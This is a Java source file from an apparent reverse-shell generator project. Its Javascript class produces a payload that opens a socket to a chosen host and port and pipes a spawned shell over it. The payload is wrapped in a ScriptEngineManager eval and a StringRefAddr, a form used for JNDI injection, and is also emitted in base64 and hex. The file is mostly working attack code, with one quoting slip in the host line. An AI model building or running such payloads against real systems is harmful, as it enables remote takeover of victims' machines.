package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Javascript extends Reverse {

    protected String shellFormat = "";

    public Javascript(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("String command = \"var host = '%s;\" +\r\n" + //
                "                       \"var port = %s;\" +\r\n" + //
                "                       \"var cmd = '%s';\"+\r\n" + //
                "                       \"var s = new java.net.Socket(host, port);\" +\r\n" + //
                "                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n" + //
                "                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n" + //
                "                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n" + //
                "                       \"print ('Connected');\"+\r\n" + //
                "                       \"while (!s.isClosed()) {\"+\r\n" + //
                "                       \"    while (pi.available() > 0)\"+\r\n" + //
                "                       \"        so.write(pi.read());\"+\r\n" + //
                "                       \"    while (pe.available() > 0)\"+\r\n" + //
                "                       \"        so.write(pe.read());\"+\r\n" + //
                "                       \"    while (si.available() > 0)\"+\r\n" + //
                "                       \"        po.write(si.read());\"+\r\n" + //
                "                       \"    so.flush();\"+\r\n" + //
                "                       \"    po.flush();\"+\r\n" + //
                "                       \"    java.lang.Thread.sleep(50);\"+\r\n" + //
                "                       \"    try {\"+\r\n" + //
                "                       \"        p.exitValue();\"+\r\n" + //
                "                       \"        break;\"+\r\n" + //
                "                       \"    }\"+\r\n" + //
                "                       \"    catch (e) {\"+\r\n" + //
                "                       \"    }\"+\r\n" + //
                "                       \"}\"+\r\n" + //
                "                       \"p.destroy();\"+\r\n" + //
                "                       \"s.close();\";\r\n" + //
                "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\n" + //
                "ref.add(new StringRefAddr(\"x\", x);", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}